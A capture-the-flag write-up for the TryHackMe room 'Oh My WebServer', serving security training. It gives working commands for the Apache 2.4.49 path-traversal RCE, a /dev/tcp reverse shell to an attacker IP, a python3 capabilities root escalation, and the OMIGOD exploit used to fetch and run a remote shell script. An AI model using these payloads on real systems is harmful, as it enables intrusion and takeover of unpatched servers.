---
description: https://tryhackme.com/room/ohmyweb
---

# Oh My WebServer

## Nmap

```
nmap 10.10.170.23 -p- -Pn -sS -sV

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Starting out on port 80 we arrive at the root page for CONSUULT.

![](<../../../.gitbook/assets/image (2079).png>)

Running a web application scan with `Nessus` against the target web server shows the running version of Apache is vulnerable to a critical exploit.

![](<../../../.gitbook/assets/image (152) (1).png>)

More details regarding the Path Traversal vulnerability are show below.

![](<../../../.gitbook/assets/image (494).png>)

Researching publicly available exploits we find a bash script available on Exploit-db.

**Exploit-db:**[https://www.exploit-db.com/exploits/50383](https://www.exploit-db.com/exploits/50383)

![](<../../../.gitbook/assets/image (1666).png>)

We can take the main part of the script into single command in order to exploit the target system as shown below; we are able read the contents of `/etc/passwd`.

```
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; /etc/passwd" "http://10.10.157.208/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh"
```

![](<../../../.gitbook/assets/image (269).png>)

To perform easier exploitation we can send the curl request through a local proxy (burpsuite) in order to capture the request.

```
curl -x localhost:8080 -s --path-as-is -d "echo Content-Type: text/plain; echo; " "http://10.10.82.103/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash"
```

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1
Host: 10.10.82.103
User-Agent: curl/7.82.0
Accept: */*
Content-Length: 52
Content-Type: application/x-www-form-urlencoded
Connection: close

echo Content-Type: text/plain; echo; cat /etc/passwd
```

![](<../../../.gitbook/assets/image (276).png>)

We can manipulate this request to receive a reverse shell.

```
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/bash HTTP/1.1
Host: 10.10.82.103
User-Agent: curl/7.82.0
Accept: */*
Content-Length: 77
Content-Type: application/x-www-form-urlencoded
Connection: close

echo Content-Type: text/plain; echo; sh -i >& /dev/tcp/10.8.239.254/4444 0>&1
```

As shown below:

![](<../../../.gitbook/assets/image (225).png>)

From here we find python3 is running on the target system, as such we spawn a python3 shell.

```
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Performing basic enumeration on the target system we find the IP of the system does not match that of the room.

![](<../../../.gitbook/assets/image (205).png>)

We also find a pretty telling `.dockerenv` file in `/`. These facts combined with the system hostname, we can safely assume we are working within a docker container.

![](<../../../.gitbook/assets/image (1220).png>)

For further enumeration `linpeas.sh` was downloaded onto the target system.

```
curl http://10.8.239.254/linpeas.sh --output linpeas.sh
```

After executing `linpeas.sh` we see that the current user has the ability to escalate privileges through capabilities set for `python3.7`.

![](<../../../.gitbook/assets/image (284).png>)

The following command can be used to escalate to **root** within the docker container.

```
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
```

![](<../../../.gitbook/assets/image (287).png>)

From here, we are able to grab the `user.txt` flag from `/root/`.

![](<../../../.gitbook/assets/image (316).png>)

For further enumeration a static `Nmap` binary was uploaded to the target system.

**Github:** [https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86\_64/nmap)

```
./nmap 172.17.0.1 -p 1-10000 -sS -v
```

As the current container is running on 172.17.0.2 we check 172.17.0.1 which, we find is running something on port 5986.

![](<../../../.gitbook/assets/image (2038).png>)

![](<../../../.gitbook/assets/image (150).png>)

Researching the port number we find that "OMI is an [open-source](https://github.com/microsoft/omi) remote configuration management tool developed by Microsoft."

According to the resource linked below this may be vulnerable to CVE-2021-38647, which could allow use to perform remote code execution on the host 172.17.0.1.

**BookHackTricks:** [https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-omi](https://book.hacktricks.xyz/pentesting/5985-5986-pentesting-omi)

**CVE:** [https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2021-38647)

**Blog:** [https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/](https://www.horizon3.ai/omigod-rce-vulnerability-in-multiple-azure-linux-deployments/)

**GitHub:** [https://github.com/horizon3ai/CVE-2021-38647](https://github.com/horizon3ai/CVE-2021-38647)

Download the Github python script from above onto the target system.

```
curl http://10.8.239.254/omigod.py --output omigod.py
```

Test for command execution:

```
python3 omigod.py -t 172.17.0.1 -c hostname
```

![](<../../../.gitbook/assets/image (1740).png>)

We can then create a bash reverse shell file "shell.sh" and perform RCE on the 172.17.0.1 system to download and execute from our attacking host.

```
python3 omigod.py -t 172.17.0.1 -c "curl http://10.8.239.254/shell.sh --output /tmp/shell.sh"
python3 omigod.py -t 172.17.0.1 -c "bash /tmp/shell.sh"
```

Giving us a root shell on the main host.

![](<../../../.gitbook/assets/image (971).png>)
